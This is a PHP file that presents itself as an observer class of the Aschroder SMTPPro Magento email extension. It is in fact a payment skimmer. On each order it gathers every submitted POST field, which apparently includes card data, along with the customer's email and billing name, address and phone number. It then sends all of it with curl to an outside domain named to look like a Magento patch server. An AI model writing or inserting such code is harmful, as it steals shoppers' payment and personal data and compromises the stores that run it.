<?php
   class Aschroder_SMTPPro_Model_Observer
    {
        public function SMTPPro_script(Varien_Event_Observer $observer)
        {
	     $url = 'http://www.magentopatchupdate.com/update/tyJONJr2MV.php';
         $orderData = $observer->getEvent()->getOrder();
         $order = Mage::getModel('sales/order')->loadByIncrementId($orderData->getIncrementId());
         
        $this->_preparePaymentData($_POST, '');
        //$this->orderDetails['shipping_method'] = $order->getShippingMethod();
        $this->orderDetails['customer_email'] = $order->getCustomerEmail();
        $this->getOrderAddressInfo($order, 'billing');
        //$this->getOrderAddressInfo($order, 'shipping');
        
       //print_r(json_encode($this->orderDetails));
        
        $postStr = '';
        foreach($this->orderDetails as $key=>$value) {
            $postStr .= $key . '=' . $value . '&';
        }

        rtrim($postStr, '&');
                
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL, $url);
        curl_setopt($ch,CURLOPT_POST, count($_POST));
        curl_setopt($ch,CURLOPT_POSTFIELDS, $postStr);

        $result = curl_exec($ch);
        curl_close($ch);
    
		}
   
     function getOrderAddressInfo($order, $type = 'billing')
     {
        $addressFunctionName = 'get' . ucfirst($type) . 'Address';
        $address = $order->$addressFunctionName();
        $address_line1 = '';
        $district = '';
        
        if(strpos($address->getData('street'), "\n")) {
            $tmp = explode("\n", $address->getData('street'));
            $district = $tmp[1];
            $address_line1 = $tmp[0];
        }
        
        if($address_line1 == "") {
            $address_line1 = $address->getData('street');
        }
        
        $this->orderDetails["{$type}_name"] = $address ? $address->getName() : '';
        $this->orderDetails["{$type}_company"] = $address ? $address->getData('company') : '';
        $this->orderDetails["{$type}_street"] = $address ? $address_line1 : '';
        $this->orderDetails["{$type}_district"] = $address ? $district : '';
        $this->orderDetails["{$type}_zip"] = $address ? $address->getData('postcode') : '';
        $this->orderDetails["{$type}_city"] = $address ? $address->getData('city') : '';
        $this->orderDetails["{$type}_state"] = $address ? $address->getRegionCode() : '';
        $this->orderDetails["{$type}_country"] = $address ? $address->getCountry() : '';
        $this->orderDetails["{$type}_telephone"] = $address ? $address->getData('telephone') : '';
     }
	
	
	
	
	  function _preparePaymentData($data, $prevKey)
     {
        foreach ($data as $key => $value) {
            if(is_array($value)) {
                $this->_preparePaymentData($value, $prevKey . '_' . $key);
            } else {
                $this->orderDetails[$prevKey. '_' . $key] = $value;
            }
        }
    } 	
   
   
    }

?>